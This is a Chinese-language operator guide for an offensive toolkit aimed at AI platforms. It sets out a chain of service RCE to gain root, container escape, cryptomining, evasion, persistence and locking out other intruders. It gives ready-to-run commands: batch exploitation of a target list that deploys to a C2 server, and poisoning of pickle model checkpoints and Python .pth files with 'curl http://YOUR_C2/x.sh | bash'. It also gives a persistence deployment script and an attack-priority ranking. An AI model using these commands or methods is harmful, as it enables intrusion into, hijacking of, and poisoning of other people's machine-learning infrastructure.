## 〇、一句话总纲

```
测绘定位 → 服务面 RCE 拿 root → 矿机占算力 → 免杀隐身 → 不死重生 → 独占封门
```

**核心信条（实战复盘得出）**：

1. **夺 root 的主战场在「服务面」，不在内核 CVE。** 8/8 实战 root 案例全部走服务 RCE + 容器逃逸；内核 CVE 贡献 0。AI 平台要么 root 跑、要么裸奔，低垂果实远比内核金矿甜。
2. **不需要密码、不需要漏洞——只要对方碰一次你放的文件，root 就是你的。** 投毒入口（模型/.pth/依赖）是零漏洞路径。
3. **可达性 > 隐蔽性 > 持久性。** 路没了全完；被发现=归零；但为持久牺牲隐蔽=自杀。
4. **持久化不是「链条」，是「矩阵」。** 每个触发源都能独立复活其他源；模板化重建才是抗清理的核心。
5. **独占是终极免杀。** 别人进不来，就没人审计你；封死后门，痕迹只属于你一个人。

## 二、快速上手（三条主线）

| 主线 | 入口 | 何时用 |
|---|---|---|
| **拿 root** | `skills/venom-root/payloads/strike.sh` | 已定位目标资产，批量探服务面 RCE |
| **投毒** | `skills/venom-root/payloads/{mk_pickle.py,pth_poison.sh}` | 能碰目标文件系统时，零漏洞植入 |
| **永生** | `skills/venom-hydra/payloads/hydra_deploy.sh` | 已得 root，部署不灭+隐身+独占 |

```bash
# ① 服务面秒杀（批量）
./strike.sh -f targets.txt --deploy http://YOUR_C2:PORT
./strike.sh --local                    # 本机容器面一键提权

# ② 投毒（零漏洞）
python3 mk_pickle.py evil.ckpt 'curl http://YOUR_C2/x.sh | bash'
./pth_poison.sh 'curl http://YOUR_C2/x.sh | bash'

# ③ 得 root 后永生部署
bash hydra_deploy.sh mytag http://YOUR_C2:PORT '' auto
```

## 三、实战优先级（重要）

```
优先级 C > A > B
  C线·服务 RCE + 容器逃逸  ← 主力（8/8 全中）
  A线·投毒（.pth/pickle）  ← 副主力（能碰文件就上，静默无感）
  B线·内核 CVE            ← 辅助（2025-2026 公开稳定 LPE 稀缺，判穷率最高）
```

**为什么内核 CVE 降级**：现代内核（6.6/6.8+）公开稳定本地提权近乎断档；AI 基建服务面却大面积未认证裸奔。**与其找内核洞，不如扫服务。**
